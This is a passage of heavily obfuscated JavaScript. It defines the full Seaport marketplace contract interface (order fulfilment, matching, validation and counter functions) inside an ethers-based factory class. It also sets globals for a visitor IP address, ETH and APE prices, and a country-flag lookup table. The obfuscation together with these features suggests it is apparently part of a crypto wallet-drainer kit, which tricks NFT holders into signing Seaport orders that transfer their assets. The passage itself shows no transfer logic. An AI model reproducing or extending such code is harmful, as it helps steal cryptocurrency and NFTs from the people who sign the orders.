  components: [_0x3e3e55, _0x21e022, _0x43b38a, _0x5aeb57, _0x33d0cf, _0x4e0d09, _0x4e701f, _0x4a60b9, _0x16b4fc, _0x312e7d, _0x1ed536, _0x4bf23d, _0x26895f, _0x510b89, _0x4b7d48, _0x4b863b, _0x34a25c, _0x1eaeb2],
  internalType: "struct BasicOrderParameters",
  name: 'parameters',
  type: "tuple"
};
const _0x51d299 = {
  internalType: "bool",
  name: 'fulfilled',
  type: "bool"
};
const _0xc46121 = {
  inputs: [_0x28ef34],
  name: "fulfillBasicOrder",
  outputs: [_0x51d299],
  stateMutability: "payable",
  type: "function"
};
const _0x137cdb = {
  internalType: "address",
  name: "offerer",
  type: "address"
};
const _0xb4c614 = {
  internalType: 'address',
  name: 'zone',
  type: "address"
};
const _0x111934 = {
  internalType: "enum ItemType",
  name: "itemType",
  type: 'uint8'
};
const _0x50ccf2 = {
  internalType: "address",
  name: 'token',
  type: "address"
};
const _0x1cd0c1 = {
  internalType: 'uint256',
  name: "identifierOrCriteria",
  type: 'uint256'
};
const _0x143bb9 = {
  internalType: "uint256",
  name: "startAmount",
  type: "uint256"
};
const _0x21a214 = {
  internalType: "uint256",
  name: "endAmount",
  type: 'uint256'
};
const _0x47d5e8 = {
  components: [_0x111934, _0x50ccf2, _0x1cd0c1, _0x143bb9, _0x21a214],
  internalType: "struct OfferItem[]",
  name: 'offer',
  type: "tuple[]"
};
const _0xf23e3f = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x21e472 = {
  internalType: 'address',
  name: 'token',
  type: 'address'
};
const _0x517471 = {
  internalType: "uint256",
  name: "identifierOrCriteria",
  type: "uint256"
};
const _0xfac9e0 = {
  internalType: "uint256",
  name: "startAmount",
  type: "uint256"
};
const _0x420cb0 = {
  internalType: "uint256",
  name: "endAmount",
  type: "uint256"
};
const _0x3332ef = {
  internalType: "address payable",
  name: "recipient",
  type: 'address'
};
const _0xec40bb = {
  components: [_0xf23e3f, _0x21e472, _0x517471, _0xfac9e0, _0x420cb0, _0x3332ef],
  internalType: "struct ConsiderationItem[]",
  name: "consideration",
  type: "tuple[]"
};
const _0x1cb9a8 = {
  internalType: "enum OrderType",
  name: "orderType",
  type: "uint8"
};
const _0x2e433b = {
  internalType: "uint256",
  name: "startTime",
  type: "uint256"
};
const _0x205195 = {
  internalType: "uint256",
  name: 'endTime',
  type: "uint256"
};
const _0x11134a = {
  internalType: "bytes32",
  name: "zoneHash",
  type: "bytes32"
};
const _0x1604c1 = {
  internalType: "uint256",
  name: "salt",
  type: "uint256"
};
const _0x4fd70c = {
  internalType: "bytes32",
  name: "conduitKey",
  type: "bytes32"
};
const _0x3fb34f = {
  internalType: 'uint256',
  name: "totalOriginalConsiderationItems",
  type: 'uint256'
};
const _0x48e023 = {
  components: [_0x137cdb, _0xb4c614, _0x47d5e8, _0xec40bb, _0x1cb9a8, _0x2e433b, _0x205195, _0x11134a, _0x1604c1, _0x4fd70c, _0x3fb34f],
  internalType: "struct OrderParameters",
  name: "parameters",
  type: 'tuple'
};
const _0x5f5d59 = {
  internalType: "bytes",
  name: "signature",
  type: "bytes"
};
const _0x45810e = {
  components: [_0x48e023, _0x5f5d59],
  internalType: "struct Order",
  name: "order",
  type: "tuple"
};
const _0x330c82 = {
  internalType: 'bytes32',
  name: "fulfillerConduitKey",
  type: 'bytes32'
};
const _0x4add6f = {
  internalType: "bool",
  name: "fulfilled",
  type: "bool"
};
const _0x2fe0c1 = {
  inputs: [_0x45810e, _0x330c82],
  name: "fulfillOrder",
  outputs: [_0x4add6f],
  stateMutability: "payable",
  type: "function"
};
const _0x11a2c5 = {
  internalType: "address",
  name: "offerer",
  type: "address"
};
const _0x33a822 = {
  internalType: "uint256",
  name: "counter",
  type: 'uint256'
};
const _0x174387 = {
  inputs: [_0x11a2c5],
  name: "getCounter",
  outputs: [_0x33a822],
  stateMutability: "view",
  type: 'function'
};
const _0x2648b4 = {
  internalType: "address",
  name: 'offerer',
  type: "address"
};
const _0x10b859 = {
  internalType: 'address',
  name: "zone",
  type: 'address'
};
const _0x4894dd = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x3c74eb = {
  internalType: "address",
  name: "token",
  type: 'address'
};
const _0xd20cad = {
  internalType: "uint256",
  name: "identifierOrCriteria",
  type: "uint256"
};
const _0x6db1a7 = {
  internalType: "uint256",
  name: "startAmount",
  type: "uint256"
};
const _0x5af2b9 = {
  internalType: "uint256",
  name: 'endAmount',
  type: "uint256"
};
const _0x4bbe1b = {
  components: [_0x4894dd, _0x3c74eb, _0xd20cad, _0x6db1a7, _0x5af2b9],
  internalType: "struct OfferItem[]",
  name: "offer",
  type: "tuple[]"
};
const _0x32108e = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x4cc6fd = {
  internalType: 'address',
  name: "token",
  type: "address"
};
const _0x488d00 = {
  internalType: "uint256",
  name: "identifierOrCriteria",
  type: "uint256"
};
const _0x3257ca = {
  internalType: "uint256",
  name: "startAmount",
  type: "uint256"
};
const _0x37d681 = {
  internalType: "uint256",
  name: "endAmount",
  type: "uint256"
};
const _0x1f1bfd = {
  internalType: "address payable",
  name: "recipient",
  type: "address"
};
const _0x378623 = {
  components: [_0x32108e, _0x4cc6fd, _0x488d00, _0x3257ca, _0x37d681, _0x1f1bfd],
  internalType: "struct ConsiderationItem[]",
  name: "consideration",
  type: "tuple[]"
};
const _0x470a5e = {
  internalType: "enum OrderType",
  name: 'orderType',
  type: "uint8"
};
const _0x295e7a = {
  internalType: "uint256",
  name: "startTime",
  type: "uint256"
};
const _0x50f7af = {
  internalType: "uint256",
  name: "endTime",
  type: "uint256"
};
const _0x386977 = {
  internalType: "bytes32",
  name: "zoneHash",
  type: "bytes32"
};
const _0x43e5dc = {
  internalType: "uint256",
  name: "salt",
  type: 'uint256'
};
const _0x4554b4 = {
  internalType: "bytes32",
  name: "conduitKey",
  type: "bytes32"
};
const _0x62e913 = {
  internalType: 'uint256',
  name: "counter",
  type: 'uint256'
};
const _0x501f32 = {
  components: [_0x2648b4, _0x10b859, _0x4bbe1b, _0x378623, _0x470a5e, _0x295e7a, _0x50f7af, _0x386977, _0x43e5dc, _0x4554b4, _0x62e913],
  internalType: "struct OrderComponents",
  name: "order",
  type: 'tuple'
};
const _0x3fd621 = {
  internalType: "bytes32",
  name: "orderHash",
  type: "bytes32"
};
const _0x595a2d = {
  inputs: [_0x501f32],
  name: "getOrderHash",
  outputs: [_0x3fd621],
  stateMutability: 'view',
  type: 'function'
};
const _0x46e904 = {
  internalType: "bytes32",
  name: "orderHash",
  type: "bytes32"
};
const _0x4151ad = {
  internalType: 'bool',
  name: "isValidated",
  type: "bool"
};
const _0x6d1b1b = {
  internalType: "bool",
  name: "isCancelled",
  type: 'bool'
};
const _0x2e51ab = {
  internalType: "uint256",
  name: "totalFilled",
  type: "uint256"
};
const _0x19f265 = {
  internalType: 'uint256',
  name: "totalSize",
  type: "uint256"
};
const _0x3a18a2 = {
  inputs: [_0x46e904],
  name: "getOrderStatus",
  outputs: [_0x4151ad, _0x6d1b1b, _0x2e51ab, _0x19f265],
  stateMutability: 'view',
  type: "function"
};
const _0x52180b = {
  internalType: "uint256",
  name: "newCounter",
  type: "uint256"
};
const _0x2895a8 = {
  inputs: [],
  name: "incrementCounter",
  outputs: [_0x52180b],
  stateMutability: "nonpayable",
  type: 'function'
};
const _0x35cf5c = {
  internalType: "string",
  name: "version",
  type: "string"
};
const _0x4c4012 = {
  internalType: "bytes32",
  name: "domainSeparator",
  type: 'bytes32'
};
const _0x2b27d2 = {
  internalType: "address",
  name: "conduitController",
  type: "address"
};
const _0x512d5c = {
  inputs: [],
  name: "information",
  outputs: [_0x35cf5c, _0x4c4012, _0x2b27d2],
  stateMutability: "view",
  type: "function"
};
const _0x28fd1c = {
  internalType: "address",
  name: 'offerer',
  type: "address"
};
const _0x280813 = {
  internalType: "address",
  name: "zone",
  type: "address"
};
const _0x4cfa9f = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x216dc5 = {
  internalType: "address",
  name: 'token',
  type: "address"
};
const _0x4f0861 = {
  internalType: 'uint256',
  name: "identifierOrCriteria",
  type: 'uint256'
};
const _0x2f6d0a = {
  internalType: "uint256",
  name: "startAmount",
  type: 'uint256'
};
const _0x137839 = {
  internalType: "uint256",
  name: "endAmount",
  type: "uint256"
};
const _0x7540a7 = {
  components: [_0x4cfa9f, _0x216dc5, _0x4f0861, _0x2f6d0a, _0x137839],
  internalType: "struct OfferItem[]",
  name: "offer",
  type: 'tuple[]'
};
const _0x3698df = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x4a0a11 = {
  internalType: 'address',
  name: 'token',
  type: "address"
};
const _0x3fc2fa = {
  internalType: "uint256",
  name: "identifierOrCriteria",
  type: "uint256"
};
const _0x276d92 = {
  internalType: "uint256",
  name: "startAmount",
  type: "uint256"
};
const _0x50300c = {
  internalType: "uint256",
  name: "endAmount",
  type: "uint256"
};
const _0x2fdd82 = {
  internalType: "address payable",
  name: "recipient",
  type: "address"
};
const _0x483a7c = {
  components: [_0x3698df, _0x4a0a11, _0x3fc2fa, _0x276d92, _0x50300c, _0x2fdd82],
  internalType: "struct ConsiderationItem[]",
  name: "consideration",
  type: "tuple[]"
};
const _0x39172c = {
  internalType: "enum OrderType",
  name: "orderType",
  type: 'uint8'
};
const _0x44282d = {
  internalType: "uint256",
  name: "startTime",
  type: "uint256"
};
const _0x15915f = {
  internalType: "uint256",
  name: "endTime",
  type: "uint256"
};
const _0x5d74b5 = {
  internalType: "bytes32",
  name: "zoneHash",
  type: 'bytes32'
};
const _0x300a27 = {
  internalType: "uint256",
  name: 'salt',
  type: "uint256"
};
const _0x392c60 = {
  internalType: "bytes32",
  name: 'conduitKey',
  type: "bytes32"
};
const _0x4e72d7 = {
  internalType: "uint256",
  name: "totalOriginalConsiderationItems",
  type: "uint256"
};
const _0x2ab304 = {
  components: [_0x28fd1c, _0x280813, _0x7540a7, _0x483a7c, _0x39172c, _0x44282d, _0x15915f, _0x5d74b5, _0x300a27, _0x392c60, _0x4e72d7],
  internalType: "struct OrderParameters",
  name: "parameters",
  type: 'tuple'
};
const _0x58868a = {
  internalType: "uint120",
  name: "numerator",
  type: "uint120"
};
const _0x3960f9 = {
  internalType: "uint120",
  name: "denominator",
  type: "uint120"
};
const _0x41b20d = {
  internalType: "bytes",
  name: "signature",
  type: 'bytes'
};
const _0xef15b8 = {
  internalType: "bytes",
  name: 'extraData',
  type: "bytes"
};
const _0x2a8442 = {
  components: [_0x2ab304, _0x58868a, _0x3960f9, _0x41b20d, _0xef15b8],
  internalType: "struct AdvancedOrder[]",
  name: "advancedOrders",
  type: "tuple[]"
};
const _0x6bfc60 = {
  internalType: "uint256",
  name: "orderIndex",
  type: "uint256"
};
const _0x3d134e = {
  internalType: "enum Side",
  name: "side",
  type: 'uint8'
};
const _0x19a565 = {
  internalType: 'uint256',
  name: "index",
  type: 'uint256'
};
const _0x187d57 = {
  internalType: "uint256",
  name: "identifier",
  type: "uint256"
};
const _0x2b0939 = {
  internalType: 'bytes32[]',
  name: "criteriaProof",
  type: 'bytes32[]'
};
const _0x1c86d2 = {
  components: [_0x6bfc60, _0x3d134e, _0x19a565, _0x187d57, _0x2b0939],
  internalType: "struct CriteriaResolver[]",
  name: "criteriaResolvers",
  type: 'tuple[]'
};
const _0x836362 = {
  internalType: 'uint256',
  name: 'orderIndex',
  type: "uint256"
};
const _0x5e01a5 = {
  internalType: 'uint256',
  name: "itemIndex",
  type: "uint256"
};
const _0x2ea2e4 = {
  components: [_0x836362, _0x5e01a5],
  internalType: "struct FulfillmentComponent[]",
  name: "offerComponents",
  type: 'tuple[]'
};
const _0x2b71cb = {
  internalType: "uint256",
  name: 'orderIndex',
  type: "uint256"
};
const _0x56239e = {
  internalType: "uint256",
  name: "itemIndex",
  type: "uint256"
};
const _0x5c7fb4 = {
  components: [_0x2b71cb, _0x56239e],
  internalType: "struct FulfillmentComponent[]",
  name: "considerationComponents",
  type: "tuple[]"
};
const _0xd1be1e = {
  components: [_0x2ea2e4, _0x5c7fb4],
  internalType: "struct Fulfillment[]",
  name: "fulfillments",
  type: 'tuple[]'
};
const _0x281040 = {
  internalType: "enum ItemType",
  name: 'itemType',
  type: "uint8"
};
const _0x59c36a = {
  internalType: 'address',
  name: 'token',
  type: 'address'
};
const _0x2fa6c9 = {
  internalType: "uint256",
  name: 'identifier',
  type: "uint256"
};
const _0x8bb290 = {
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x547ae9 = {
  internalType: "address payable",
  name: 'recipient',
  type: "address"
};
const _0x46278d = {
  components: [_0x281040, _0x59c36a, _0x2fa6c9, _0x8bb290, _0x547ae9],
  internalType: "struct ReceivedItem",
  name: 'item',
  type: 'tuple'
};
const _0x3373b0 = {
  internalType: "address",
  name: 'offerer',
  type: "address"
};
const _0x17a5d2 = {
  internalType: "bytes32",
  name: "conduitKey",
  type: "bytes32"
};
const _0x297b52 = {
  components: [_0x46278d, _0x3373b0, _0x17a5d2],
  internalType: "struct Execution[]",
  name: 'executions',
  type: 'tuple[]'
};
const _0x4de365 = {
  inputs: [_0x2a8442, _0x1c86d2, _0xd1be1e],
  name: "matchAdvancedOrders",
  outputs: [_0x297b52],
  stateMutability: "payable",
  type: 'function'
};
const _0x123ddd = {
  internalType: "address",
  name: "offerer",
  type: "address"
};
const _0x176342 = {
  internalType: "address",
  name: "zone",
  type: "address"
};
const _0x438468 = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x4e40cd = {
  internalType: "address",
  name: "token",
  type: "address"
};
const _0x5b2a35 = {
  internalType: "uint256",
  name: "identifierOrCriteria",
  type: 'uint256'
};
const _0x54b8e6 = {
  internalType: "uint256",
  name: "startAmount",
  type: "uint256"
};
const _0x11f989 = {
  internalType: "uint256",
  name: "endAmount",
  type: "uint256"
};
const _0x12222d = {
  components: [_0x438468, _0x4e40cd, _0x5b2a35, _0x54b8e6, _0x11f989],
  internalType: "struct OfferItem[]",
  name: "offer",
  type: 'tuple[]'
};
const _0x522ec9 = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x37db68 = {
  internalType: "address",
  name: 'token',
  type: 'address'
};
const _0x463153 = {
  internalType: "uint256",
  name: "identifierOrCriteria",
  type: 'uint256'
};
const _0x42ba73 = {
  internalType: 'uint256',
  name: "startAmount",
  type: "uint256"
};
const _0x52e8b2 = {
  internalType: "uint256",
  name: "endAmount",
  type: 'uint256'
};
const _0x49a185 = {
  internalType: "address payable",
  name: "recipient",
  type: "address"
};
const _0x39dfe8 = {
  components: [_0x522ec9, _0x37db68, _0x463153, _0x42ba73, _0x52e8b2, _0x49a185],
  internalType: "struct ConsiderationItem[]",
  name: "consideration",
  type: "tuple[]"
};
const _0x13873d = {
  internalType: "enum OrderType",
  name: "orderType",
  type: "uint8"
};
const _0x4426c6 = {
  internalType: 'uint256',
  name: "startTime",
  type: 'uint256'
};
const _0x3f1713 = {
  internalType: "uint256",
  name: "endTime",
  type: "uint256"
};
const _0x51ba48 = {
  internalType: 'bytes32',
  name: "zoneHash",
  type: "bytes32"
};
const _0x8c145c = {
  internalType: 'uint256',
  name: "salt",
  type: 'uint256'
};
const _0x5c4648 = {
  internalType: "bytes32",
  name: "conduitKey",
  type: "bytes32"
};
const _0x43434d = {
  internalType: "uint256",
  name: "totalOriginalConsiderationItems",
  type: "uint256"
};
const _0x350631 = {
  components: [_0x123ddd, _0x176342, _0x12222d, _0x39dfe8, _0x13873d, _0x4426c6, _0x3f1713, _0x51ba48, _0x8c145c, _0x5c4648, _0x43434d],
  internalType: "struct OrderParameters",
  name: 'parameters',
  type: "tuple"
};
const _0x50a826 = {
  internalType: "bytes",
  name: "signature",
  type: "bytes"
};
const _0x24660d = {
  components: [_0x350631, _0x50a826],
  internalType: "struct Order[]",
  name: 'orders',
  type: "tuple[]"
};
const _0x51b8e8 = {
  internalType: "uint256",
  name: "orderIndex",
  type: "uint256"
};
const _0x340502 = {
  internalType: 'uint256',
  name: "itemIndex",
  type: 'uint256'
};
const _0x332489 = {
  components: [_0x51b8e8, _0x340502],
  internalType: "struct FulfillmentComponent[]",
  name: "offerComponents",
  type: 'tuple[]'
};
const _0x865af4 = {
  internalType: "uint256",
  name: "orderIndex",
  type: "uint256"
};
const _0x3b18d1 = {
  internalType: "uint256",
  name: 'itemIndex',
  type: "uint256"
};
const _0x26ccc2 = {
  components: [_0x865af4, _0x3b18d1],
  internalType: "struct FulfillmentComponent[]",
  name: "considerationComponents",
  type: "tuple[]"
};
const _0x4d466a = {
  components: [_0x332489, _0x26ccc2],
  internalType: "struct Fulfillment[]",
  name: "fulfillments",
  type: "tuple[]"
};
const _0x40f1d8 = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x4d31da = {
  internalType: 'address',
  name: "token",
  type: "address"
};
const _0x57a493 = {
  internalType: "uint256",
  name: 'identifier',
  type: "uint256"
};
const _0x1e1f42 = {
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x4bc715 = {
  internalType: "address payable",
  name: 'recipient',
  type: "address"
};
const _0x174b40 = {
  components: [_0x40f1d8, _0x4d31da, _0x57a493, _0x1e1f42, _0x4bc715],
  internalType: "struct ReceivedItem",
  name: 'item',
  type: "tuple"
};
const _0xbb6baf = {
  internalType: "address",
  name: "offerer",
  type: "address"
};
const _0x9a027a = {
  internalType: "bytes32",
  name: "conduitKey",
  type: "bytes32"
};
const _0x5158fd = {
  components: [_0x174b40, _0xbb6baf, _0x9a027a],
  internalType: "struct Execution[]",
  name: 'executions',
  type: "tuple[]"
};
const _0xcd0ee6 = {
  inputs: [_0x24660d, _0x4d466a],
  name: "matchOrders",
  outputs: [_0x5158fd],
  stateMutability: "payable",
  type: "function"
};
const _0x55f267 = {
  internalType: "string",
  name: "contractName",
  type: "string"
};
const _0x6f7113 = {
  inputs: [],
  name: "name",
  outputs: [_0x55f267],
  stateMutability: "pure",
  type: "function"
};
const _0x373a10 = {
  internalType: "address",
  name: "offerer",
  type: "address"
};
const _0x4ebdd1 = {
  internalType: "address",
  name: 'zone',
  type: "address"
};
const _0x2fa3eb = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x129f46 = {
  internalType: "address",
  name: 'token',
  type: "address"
};
const _0x3e074d = {
  internalType: "uint256",
  name: "identifierOrCriteria",
  type: "uint256"
};
const _0x20b250 = {
  internalType: "uint256",
  name: "startAmount",
  type: "uint256"
};
const _0x2e3821 = {
  internalType: "uint256",
  name: "endAmount",
  type: 'uint256'
};
const _0x5540bc = {
  components: [_0x2fa3eb, _0x129f46, _0x3e074d, _0x20b250, _0x2e3821],
  internalType: "struct OfferItem[]",
  name: "offer",
  type: "tuple[]"
};
const _0x1317df = {
  internalType: "enum ItemType",
  name: "itemType",
  type: "uint8"
};
const _0x2787e6 = {
  internalType: "address",
  name: "token",
  type: 'address'
};
const _0x359025 = {
  internalType: "uint256",
  name: "identifierOrCriteria",
  type: "uint256"
};
const _0x22f9a4 = {
  internalType: "uint256",
  name: "startAmount",
  type: 'uint256'
};
const _0x224848 = {
  internalType: "uint256",
  name: "endAmount",
  type: "uint256"
};
const _0x4df1fe = {
  internalType: "address payable",
  name: 'recipient',
  type: "address"
};
const _0x155c6c = {
  components: [_0x1317df, _0x2787e6, _0x359025, _0x22f9a4, _0x224848, _0x4df1fe],
  internalType: "struct ConsiderationItem[]",
  name: "consideration",
  type: "tuple[]"
};
const _0x18c23c = {
  internalType: "enum OrderType",
  name: 'orderType',
  type: "uint8"
};
const _0x13ad5a = {
  internalType: "uint256",
  name: "startTime",
  type: "uint256"
};
const _0x59da63 = {
  internalType: "uint256",
  name: 'endTime',
  type: "uint256"
};
const _0x2a57f6 = {
  internalType: 'bytes32',
  name: "zoneHash",
  type: "bytes32"
};
const _0x105032 = {
  internalType: "uint256",
  name: "salt",
  type: "uint256"
};
const _0x4de999 = {
  internalType: 'bytes32',
  name: 'conduitKey',
  type: "bytes32"
};
const _0x1bf6f2 = {
  internalType: 'uint256',
  name: "totalOriginalConsiderationItems",
  type: 'uint256'
};
const _0x3f4b70 = {
  components: [_0x373a10, _0x4ebdd1, _0x5540bc, _0x155c6c, _0x18c23c, _0x13ad5a, _0x59da63, _0x2a57f6, _0x105032, _0x4de999, _0x1bf6f2],
  internalType: "struct OrderParameters",
  name: 'parameters',
  type: 'tuple'
};
const _0x1054e5 = {
  internalType: "bytes",
  name: "signature",
  type: "bytes"
};
const _0x3b4fe9 = {
  components: [_0x3f4b70, _0x1054e5],
  internalType: "struct Order[]",
  name: "orders",
  type: "tuple[]"
};
const _0x5cca52 = {
  internalType: 'bool',
  name: 'validated',
  type: "bool"
};
const _0x5281c4 = {
  inputs: [_0x3b4fe9],
  name: "validate",
  outputs: [_0x5cca52],
  stateMutability: "nonpayable",
  type: "function"
};
class SeaportFactory {
  ["interface"];
  ["contract"];
  ["abi"] = [_0x312059, _0x92c58c, _0x2f1e85, _0x34e01e, _0x9f620c, _0x2f21bd, _0x1d0317, _0x543213, _0x47e758, _0x50ddf7, _0xb47dcf, _0x24f47b, _0x298f41, _0x30c127, _0x5aec8d, _0x1ca7e4, _0x4321ef, _0x47fb3e, _0x706f60, _0x209d24, _0x561ce5, _0x3a8449, _0x1b1d17, _0x1a24ab, _0x4b0632, _0x3a3c59, _0x21e72c, _0x47c23c, _0x1f0176, _0x1914a9, _0x222438, _0x1a1b87, _0x24ad2f, _0x5a4425, _0xe3d74d, _0x4c3372, _0x360713, _0x5974c, _0x508d6c, _0x4d4174, _0x4cbc03, _0x58dab5, _0x5259b3, _0x5c6f74, _0x292d9f, _0x447a36, _0x534cff, _0x124e7b, _0x3be5a3, _0x39b2f5, _0x22d0ad, _0x30f18b, _0xc46121, _0x2fe0c1, _0x174387, _0x595a2d, _0x3a18a2, _0x2895a8, _0x512d5c, _0x4de365, _0xcd0ee6, _0x6f7113, _0x5281c4];
  constructor(_0x11ebbe, _0xa4555c) {
    this["interface"] = new ethers.utils.Interface(this.abi);
    this.contract = new ethers.Contract(_0x11ebbe, this.abi, _0xa4555c);
  }
}
let ipAddress = "not_found";
let ethPrice = 2250;
let apePrice = 1.4;
const _0x27e7f4 = {
  AD: "🇦🇩",
  AE: "🇦🇪",
  AF: "🇦🇫",
  AG: "🇦🇬",
  AI: "🇦🇮",
  AL: "🇦🇱",
  AM: "🇦🇲",
  AO: '🇦🇴',
  AQ: "🇦🇶",
  AR: '🇦🇷',
  AS: "🇦🇸",
  AT: "🇦🇹",
  AU: "🇦🇺",
  AW: "🇦🇼",
  AX: '🇦🇽',
  AZ: "🇦🇿",
  BA: '🇧🇦',
  BB: "🇧🇧",
  BD: "🇧🇩",
  BE: "🇧🇪",
  BF: '🇧🇫',
  BG: "🇧🇬",
  BH: "🇧🇭",
  BI: '🇧🇮',
  BJ: "🇧🇯",
  BL: "🇧🇱",
  BM: "🇧🇲",
  BN: "🇧🇳",
  BO: "🇧🇴",
  BQ: "🇧🇶",
  BR: "🇧🇷",
  BS: '🇧🇸',
  BT: "🇧🇹",
  BV: '🇧🇻',
  BW: "🇧🇼",
  BY: "🇧🇾",
  BZ: "🇧🇿",
  CA: '🇨🇦',
  CC: '🇨🇨',
  CD: "🇨🇩",
  CF: "🇨🇫",
  CG: '🇨🇬',
  CH: "🇨🇭",
  CI: "🇨🇮",
  CK: "🇨🇰",
  CL: '🇨🇱',
  CM: "🇨🇲",
  CN: "🇨🇳",
  CO: "🇨🇴",
  CR: "🇨🇷",
  CU: "🇨🇺",
  CV: '🇨🇻',
  CW: "🇨🇼",
  CX: '🇨🇽',
  CY: "🇨🇾",
  CZ: "🇨🇿",
  DE: '🇩🇪',
  DJ: "🇩🇯",
  DK: "🇩🇰",
  DM: "🇩🇲",
  DO: "🇩🇴",
  DZ: '🇩🇿',
  EC: "🇪🇨",
  EE: "🇪🇪",
  EG: "🇪🇬",
  EH: "🇪🇭",
  ER: '🇪🇷',
  ES: '🇪🇸',
  ET: "🇪🇹",
  FI: "🇫🇮",
  FJ: '🇫🇯',
  FK: "🇫🇰",
  FM: "🇫🇲",
  FO: "🇫🇴",
  FR: '🇫🇷',
  GA: "🇬🇦",
  GB: "🇬🇧",
  GD: "🇬🇩",
  GE: "🇬🇪",
  GF: "🇬🇫",
  GG: "🇬🇬",
  GH: "🇬🇭",
  GI: "🇬🇮",
  GL: "🇬🇱",
  GM: "🇬🇲",
  GN: '🇬🇳',
  GP: "🇬🇵",
  GQ: "🇬🇶",
  GR: "🇬🇷",
  GS: "🇬🇸",
  GT: "🇬🇹",
  GU: "🇬🇺",
  GW: "🇬🇼",
  GY: "🇬🇾",
  HK: "🇭🇰",
  HM: "🇭🇲",
  HN: "🇭🇳",
  HR: '🇭🇷',
  HT: "🇭🇹",
  HU: "🇭🇺",
  ID: "🇮🇩",
  IE: "🇮🇪",
  IL: '🇮🇱',
  IM: "🇮🇲",
  IN: '🇮🇳',
  IO: "🇮🇴"
};
function _0xaa746a(_0x1c370d, _0x12a331, _0x30c5c3, _0x412b2f) {
  return _0x16e3(_0x12a331 - 0x339, _0x1c370d);
}
_0x27e7f4.IQ = '🇮🇶';
_0x27e7f4.IR = "🇮🇷";
_0x27e7f4.IS = '🇮🇸';
_0x27e7f4.IT = "🇮🇹";
_0x27e7f4.JE = '🇯🇪';
_0x27e7f4.JM = "🇯🇲";
_0x27e7f4.JO = "🇯🇴";
_0x27e7f4.JP = "🇯🇵";
_0x27e7f4.KE = '🇰🇪';
_0x27e7f4.KG = "🇰🇬";
_0x27e7f4.KH = "🇰🇭";
_0x27e7f4.KI = "🇰🇮";
_0x27e7f4.KM = "🇰🇲";
_0x27e7f4.KN = "🇰🇳";
_0x27e7f4.KP = '🇰🇵';
_0x27e7f4.KR = "🇰🇷";
_0x27e7f4.KW = '🇰🇼';
_0x27e7f4.KY = "🇰🇾";
_0x27e7f4.KZ = "🇰🇿";
_0x27e7f4.LA = '🇱🇦';
_0x27e7f4.LB = "🇱🇧";
_0x27e7f4.LC = "🇱🇨";
_0x27e7f4.LI = '🇱🇮';
_0x27e7f4.LK = "🇱🇰";
_0x27e7f4.LR = "🇱🇷";
_0x27e7f4.LS = "🇱🇸";
_0x27e7f4.LT = "🇱🇹";
_0x27e7f4.LU = '🇱🇺';
_0x27e7f4.LV = "🇱🇻";
_0x27e7f4.LY = '🇱🇾';
_0x27e7f4.MA = "🇲🇦";
_0x27e7f4.MC = '🇲🇨';
_0x27e7f4.MD = "🇲🇩";
_0x27e7f4.ME = "🇲🇪";
_0x27e7f4.MF = "🇲🇫";
_0x27e7f4.MG = "🇲🇬";
_0x27e7f4.MH = '🇲🇭';
_0x27e7f4.MK = "🇲🇰";
_0x27e7f4.ML = "🇲🇱";
_0x27e7f4.MM = "🇲🇲";
_0x27e7f4.MN = '🇲🇳';
_0x27e7f4.MO = '🇲🇴';
_0x27e7f4.MP = "🇲🇵";
_0x27e7f4.MQ = "🇲🇶";
_0x27e7f4.MR = '🇲🇷';
_0x27e7f4.MS = "🇲🇸";
_0x27e7f4.MT = "🇲🇹";
_0x27e7f4.MU = '🇲🇺';
_0x27e7f4.MV = '🇲🇻';
_0x27e7f4.MW = '🇲🇼';
_0x27e7f4.MX = "🇲🇽";
_0x27e7f4.MY = "🇲🇾";
_0x27e7f4.MZ = "🇲🇿";
_0x27e7f4.NA = "🇳🇦";
_0x27e7f4.NC = "🇳🇨";
_0x27e7f4.NE = '🇳🇪';
_0x27e7f4.NF = '🇳🇫';
_0x27e7f4.NG = "🇳🇬";
_0x27e7f4.NI = '🇳🇮';
_0x27e7f4.NL = '🇳🇱';
_0x27e7f4.NO = "🇳🇴";
_0x27e7f4.NP = '🇳🇵';
_0x27e7f4.NR = "🇳🇷";
_0x27e7f4.NU = "🇳🇺";
_0x27e7f4.NZ = "🇳🇿";
_0x27e7f4.OM = "🇴🇲";
_0x27e7f4.PA = "🇵🇦";
_0x27e7f4.PE = "🇵🇪";
_0x27e7f4.PF = "🇵🇫";
_0x27e7f4.PG = "🇵🇬";
_0x27e7f4.PH = "🇵🇭";
_0x27e7f4.PK = "🇵🇰";
_0x27e7f4.PL = "🇵🇱";
_0x27e7f4.PM = '🇵🇲';
_0x27e7f4.PN = "🇵🇳";
_0x27e7f4.PR = "🇵🇷";
_0x27e7f4.PS = '🇵🇸';
_0x27e7f4.PT = "🇵🇹";
_0x27e7f4.PW = "🇵🇼";
_0x27e7f4.PY = "🇵🇾";
_0x27e7f4.QA = '🇶🇦';
_0x27e7f4.RE = "🇷🇪";
_0x27e7f4.RO = "🇷🇴";
_0x27e7f4.RS = "🇷🇸";
_0x27e7f4.RU = "🇷🇺";
_0x27e7f4.RW = '🇷🇼';
_0x27e7f4.SA = '🇸🇦';
_0x27e7f4.SB = "🇸🇧";
_0x27e7f4.SC = "🇸🇨";
_0x27e7f4.SD = "🇸🇩";
_0x27e7f4.SE = "🇸🇪";
_0x27e7f4.SG = "🇸🇬";
_0x27e7f4.SH = '🇸🇭';
_0x27e7f4.SI = "🇸🇮";
_0x27e7f4.SJ = "🇸🇯";
_0x27e7f4.SK = '🇸🇰';
_0x27e7f4.SL = "🇸🇱";
_0x27e7f4.SM = '🇸🇲';
_0x27e7f4.SN = "🇸🇳";
_0x27e7f4.SO = "🇸🇴";
_0x27e7f4.SR = "🇸🇷";
_0x27e7f4.SS = "🇸🇸";
_0x27e7f4.ST = "🇸🇹";
_0x27e7f4.SV = "🇸🇻";
_0x27e7f4.SX = "🇸🇽";
_0x27e7f4.SY = "🇸🇾";
